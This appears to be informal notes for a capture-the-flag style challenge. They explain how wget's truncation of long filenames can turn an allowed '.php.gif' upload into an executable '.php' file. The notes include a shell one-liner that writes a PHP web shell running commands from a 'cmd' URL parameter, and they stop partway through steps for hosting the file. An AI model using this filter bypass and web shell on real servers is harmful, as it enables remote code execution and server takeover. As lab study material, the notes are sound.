 The Core Vulnerability: wget Filename Truncation
 if you ask it to download a file with a very long filename (over 236 characters), 
 wget will cut the name and save the file with the shortened version.
 
The filename needs to be constructed very precisely:
	 -    It must be longer than 236 characters.
	 -    The first 232 characters can be anything (e.g., the letter "A").
	 -    The next 4 characters must be .php.
	 -    The final characters must be a valid image extension that the server allows, such as .gif. 
	 -    the file looks like:  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA....(232 A's)....AAAA.php.gif 




1- the filter will check from the last extension of the file .gif, this means we bypass the filter
   but we can not execute it as php filters, so ..

2- wget will cut the name of the name of the file to be make it 236
   after cutting, the file will be like the following:  Ax232.php

3- now there is a php file on the server and we can use this file to perform instruction on
   the server ...


4- now we need to write a payload in this file. you can do that like the following
  $ echo '<?php echo system($_GET["cmd"]); ?>' > $(printf 'A'%.0s {1..232}).php.gif

	 _____________________________________________________________________________
	|									      |
	| printf 'A'%.0s 1 2 3							      |
	| - Takes the number 1 → prints A → prints 0 characters of 1 → output: A      |
	| - Takes the number 2 → prints A → prints 0 characters of 2 → output: AA     |
	| - Takes the number 3 → prints A → prints 0 characters of 3 → output: AAA    |
	|_____________________________________________________________________________|


	- $_GET is a superglobal array in PHP that contains parameters sent via the URL query string. 
	  Example URL: http://Public-IP/Ax232.php?cmd=ls



5- now we need to upload this file into a pubic IP, I will upload it into Github
	- go to ur github
	- $ mkdir f2up-challenge
